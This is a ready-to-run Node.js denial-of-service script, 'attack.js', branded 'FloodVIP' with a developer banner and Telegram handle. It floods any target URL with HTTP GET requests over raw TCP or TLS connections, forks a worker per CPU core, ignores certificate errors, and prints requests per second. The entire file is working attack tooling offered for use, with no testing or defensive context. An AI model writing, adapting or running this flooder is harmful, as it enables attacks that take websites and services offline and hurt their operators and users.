const net = require('net');
const tls = require('tls');
const cluster = require('cluster');
const os = require('os');

const [,, target, seconds = 30] = process.argv;
if (!target) return console.error('Dùng: node attack.js <URL> [giây]');


console.clear();
console.log(`
██████  ██    ██  ██████   ██████     ██████  ███████ ██    ██ 
██   ██ ██    ██ ██    ██ ██          ██   ██ ██      ██    ██ 
██   ██ ██    ██ ██    ██ ██          ██   ██ █████   ██    ██ 
██   ██ ██    ██ ██    ██ ██          ██   ██ ██       ██  ██  
██████   ██████   ██████   ██████     ██████  ███████   ████   

FloodVIP Script - Developed by DuocDev
Telegram: @DuocDev
All Rights Reserved © 2026
`);
console.log(`Target: ${target}`);
console.log(`Thời gian: ${seconds}s`);
console.log(`Số worker: ${os.cpus().length}`);
console.log('Đang tấn công... (RPS sẽ hiển thị mỗi giây)\n');

const { hostname, port = 443, protocol, pathname = '/' } = new URL(target);
const isHttps = protocol === 'https:';
const portNum = parseInt(port) || (isHttps ? 443 : 80);

function g() { 
  const s = isHttps
    ? tls.connect({ host: hostname, port: portNum, rejectUnauthorized: false })
    : net.connect({ host: hostname, port: portNum });
  s.on('connect', () => {
    s.write(`GET ${pathname} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n`);
    setTimeout(() => s.destroy(), 1000);
  });
  s.on('error', () => {});
}

if (cluster.isMaster) {

  for (let i = 0; i < os.cpus().length; i++) cluster.fork();

 
  let totalReqs = 0;
  for (const id in cluster.workers) {
    cluster.workers[id].on('message', (msg) => {
      if (msg.cmd === 'stats') totalReqs += msg.count;
    });
  }


  setInterval(() => {
    console.log(`[${new Date().toLocaleTimeString()}] RPS: ${totalReqs}`);
    totalReqs = 0;
  }, 1000);

 
  setTimeout(() => {
    process.exit(0);
  }, seconds * 1000);
} else {
 
  let reqCount = 0;
  setInterval(() => {
    for (let i = 0; i < 15 + Math.random() * 20; i++) {
      g();
      reqCount++;
    }
  }, 200);

  
  setInterval(() => {
    process.send({ cmd: 'stats', count: reqCount });
    reqCount = 0;
  }, 1000);
}
